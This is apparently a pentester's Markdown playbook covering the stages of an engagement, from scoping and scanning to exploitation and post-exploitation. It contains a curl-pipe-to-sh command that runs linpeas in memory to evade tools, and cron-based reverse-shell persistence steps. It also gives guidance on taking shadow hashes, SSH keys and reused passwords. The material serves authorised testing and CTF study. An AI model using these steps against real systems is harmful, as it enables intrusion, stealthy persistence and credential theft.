# Pentest Process

### Scoping (Comes directly from client)

- This information will be found in the SoW (Scope of Work) and will be in the form of a list of hostnames/IP's

### Recon (passive and active, OSINT & Scanning)

#### passive (Googling/OSINT/HUMINT)

<----------------------> 

Line in the Proverbial Sand|Federal Offense Territory

#### active (Make sure machine is online/finding other machines, find open ports, look for vulnerable services/webpage)

- ([Ping Sweep](./ping_sweep.md) (-sn/for loop one-liner/arp -a){this is how we verify where other machies are on the network} 
- NMap (fast,service,all scans){This is how we find open ports on targets}
- Vuln Assessment (Openvas, Nessus){These can be used to find Low Hanging Fruit on an engagement}
- phishing/social engineering)
- (Brute forcing accounts/emails)

### Exploitation 

- Find vulnerability via scanned service by further enumerating any open ports that you find, otherwise you have to create/find your own zero-day
- find exploit Proof of Concept (PoC) code/payload via Google or seachsploit 
- [catch a reverse shell](https://github.com/Gadoof/Gadoof/blob/main/reverse_shell_playbook.md#basic-reverse-shell)
- [upgrade your shell](https://github.com/Gadoof/Gadoof/blob/main/reverse_shell_playbook.md#enable-fully-interactive-shell)
	- Remember that this process is dangerous if you're using an unstable exploit!

### Post-Exploitation

#### - [priv esc](./priv_esc_playbook) = get to root

- linpeas/winpeas
    - Be sure to be running screen/tmux, use logging (ctr + a; H) to catch the output of this next command
    - curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh == will run in memory, should help with bypass for basic tools
    - Can also host with a simple python web server or utilizing SMB to run in memory

#### - pivoting = 

- check arp cache = good for a static check against a local cache of targets; not thorough, especially against segmented VLANs
- [ping_sweep](./ping_sweep.md) = how we find internal targets, ran from victim1
- [proxychains from Kali](./pivoting_playbook.md) = how we interact with internal targets

#### - persistence = setup a way for the box to always send you a reverse shell

- This process becomes PRIORITY if you're using an unstable exploit, you do this before you upgrade!
- Will need a fully functional shell to get this step to work...
	- Find your favorite reverse shell and validate that it works from the victim back to your attacker machine
	- sudo crontab -e
	- add in 5 "*" with spaces between each and before your reverse shell
	- save that and then open your reverse shell to catch a rev shell every minute from the victim

#### - data exfil = loot 

- hard coded passwords
	- Check servies that are running to see if anything like a database might be running; it's possible that you may be able to read some of those config files and they often will utilize hard coded passwords for the service accounts to access the database
- ssh/rsa keys
	- These can be used to potentially perform priv esc if the key itself doesn't require a password/passphrase
- hashed passwords in /etc/shadow) 
	- Cracking passwords that are from real engagements can be difficult, our expectation is something like 1% real world; so if i have 100 users I will likely crack one password/account
- ctf flags
	- Often located in a users home directory as flag.txt or a root users home directory (/root) as root.txt 
- look for password reuse attack opportunities
	- Probably the most important aspect of post exploitation; you should be gathering usernames/passwords throughout the engagement and attempting them against other services, even services that you've already attempted to hack. 
